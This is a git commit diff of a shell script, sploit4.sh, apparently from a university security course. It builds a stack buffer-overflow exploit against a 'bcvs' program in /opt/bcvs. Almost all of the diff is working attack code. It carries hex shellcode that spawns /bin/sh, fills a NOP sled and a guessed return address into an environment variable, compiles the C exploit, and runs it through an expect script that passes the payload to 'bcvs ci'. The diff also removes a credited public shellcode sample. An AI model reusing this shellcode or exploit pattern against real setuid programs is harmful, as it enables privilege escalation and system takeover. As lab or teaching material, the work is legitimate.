6877a0c78097d7b382a7afcff4b33380f7092bc0
Melody Liu <liu00401@umn.edu>
2020-10-23 22:47:18 -0500

    moremoremore

--- sploit4.sh
+++ sploit4.sh
@@ -4,77 +4,35 @@ cd /opt/bcvs
 
 touch shellcode.c
 cat <<EOF>> shellcode.c
-/**
- *           [ http://www.hacknroll.com ]
- *
- * Description:
- *    FreeBSD x86-64 exec("/bin/sh") Shellcode - 31 bytes
- *
- * Authors:
- *    Maycon M. Vitali ( 0ut0fBound )
- *        Milw0rm .: http://www.milw0rm.com/author/869
- *        Page ....: http://maycon.hacknroll.com
- *        Email ...: maycon@hacknroll.com
- *
- *    Anderson Eduardo ( c0d3_z3r0 )
- *        Milw0rm .: http://www.milw0rm.com/author/1570
- *        Page ....: http://anderson.hacknroll.com
- *        Email ...: anderson@hacknroll.com
- * 
- * -------------------------------------------------------
- *   
- * amd64# gcc hacknroll.c -o hacknroll
- * amd64# ./hacknroll
- * # exit
- * amd64#
- *
- * -------------------------------------------------------
- */
 #include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
 
 #define DEFAULT_OFFSET                    0
 #define DEFAULT_BUFFER_SIZE             512
-#define DEFAULT_EGG_SIZE               2048
 #define NOP                            0x90
 
-const char shellcode[] =
-        "\x48\x31\xc0"                               // xor    %rax,%rax
-        "\x99"                                       // cltd
-        "\xb0\x3b"                                   // mov    $0x3b,%al
-        "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"   // mov $0x68732f6e69622fff,%rdi
-        "\x48\xc1\xef\x08"                           // shr    $0x8,%rdi
-        "\x57"                                       // push   %rdi
-        "\x48\x89\xe7"                               // mov    %rsp,%rdi
-        "\x57"                                       // push   %rdi
-        "\x52"                                       // push   %rdx
-        "\x48\x89\xe6"                               // mov    %rsp,%rsi
-        "\x0f\x05";                                  // syscall
+char shellcode[] = "\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05";
 
-unsigned long get_esp(void) {
+unsigned long get_sp(void) {
    __asm__("movl %esp,%eax");
 }
 
 void main(int argc, char *argv[]) {
-  char *buff, *ptr, *egg;
+  char *buff, *ptr;
   long *addr_ptr, addr;
   int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
-  int i, eggsize=DEFAULT_EGG_SIZE;
+  int i;
 
-  if (argc > 1) bsize   = atoi(argv[1]);
-  if (argc > 2) offset  = atoi(argv[2]);
-  if (argc > 3) eggsize = atoi(argv[3]);
-
+  if (argc > 1) bsize  = atoi(argv[1]);
+  if (argc > 2) offset = atoi(argv[2]);
 
   if (!(buff = malloc(bsize))) {
     printf("Can't allocate memory.\n");
     exit(0);
   }
-  if (!(egg = malloc(eggsize))) {
-    printf("Can't allocate memory.\n");
-    exit(0);
-  }
 
-  addr = get_esp() - offset;
+  addr = get_sp() - offset;
   printf("Using address: 0x%x\n", addr);
 
   ptr = buff;
@@ -82,33 +40,29 @@ void main(int argc, char *argv[]) {
   for (i = 0; i < bsize; i+=4)
     *(addr_ptr++) = addr;
 
-  ptr = egg;
-  for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
-    *(ptr++) = NOP;
+  for (i = 0; i < bsize/2; i++)
+    buff[i] = NOP;
 
+  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
   for (i = 0; i < strlen(shellcode); i++)
     *(ptr++) = shellcode[i];
 
   buff[bsize - 1] = '\0';
-  egg[eggsize - 1] = '\0';
 
-  memcpy(egg,"EGG=",4);
-  putenv(egg);
-  memcpy(buff,"RET=",4);
+  memcpy(buff,"EGG=",4);
   putenv(buff);
-  system("/bin/bash");
 }
 
 EOF
 
 gcc -o shellcode shellcode.c
-./shellcode 432
+./shellcode 172 432
 
 touch expfile.exp
 cat <<EOF>> expfile.exp
 #!/usr/bin/expect -f
 set timeout -1
-spawn ./bcvs ci $RET
+spawn ./bcvs ci $EGG
 
 expect "Please write a SHORT explanation:\r"
 send -- "anything\r"
